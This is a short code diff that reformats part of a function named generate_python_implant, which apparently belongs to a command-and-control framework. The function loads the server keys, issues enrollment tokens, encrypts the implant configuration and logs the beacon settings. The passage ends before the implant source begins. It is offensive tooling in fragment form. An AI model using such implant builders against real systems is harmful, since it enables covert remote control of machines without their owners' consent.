@@ -124,23 +124,15 @@ def generate_python_implant(
     if not server_pub_b64:
         from core.c2.builder import load_server_pub_key
 
-        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
-            os.path.abspath(__file__)
-        ))))
-        server_pub_b64 = load_server_pub_key(
-            os.path.join(base_dir, "data", "keys", "server_x25519_public.pem")
-        )
+        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+        server_pub_b64 = load_server_pub_key(os.path.join(base_dir, "data", "keys", "server_x25519_public.pem"))
     if len(base64.b64decode(server_pub_b64, validate=True)) != 32:
         raise ValueError("server_pub_b64 must contain a raw 32-byte X25519 key")
     if not enrollment_token:
         from core.c2.enrollment import EnrollmentAuthority
 
-        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
-            os.path.abspath(__file__)
-        ))))
-        enrollment_token = EnrollmentAuthority(
-            os.path.join(base_dir, "data", "keys", "enrollment.key")
-        ).issue()
+        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+        enrollment_token = EnrollmentAuthority(os.path.join(base_dir, "data", "keys", "enrollment.key")).issue()
 
     # Generate encryption key and split it
     config_key = secrets.token_bytes(32)
@@ -154,8 +146,9 @@ def generate_python_implant(
     }
     enc_blob = _encrypt_config(config, config_key)
 
-    logger.info("Generated Python implant: %d C2 URLs, interval=%ds, jitter=%d%%",
-                len(c2_urls), beacon_interval, jitter_percent)
+    logger.info(
+        "Generated Python implant: %d C2 URLs, interval=%ds, jitter=%d%%", len(c2_urls), beacon_interval, jitter_percent
+    )
 
     # Build the implant source code
     implant_code = textwrap.dedent(f'''\
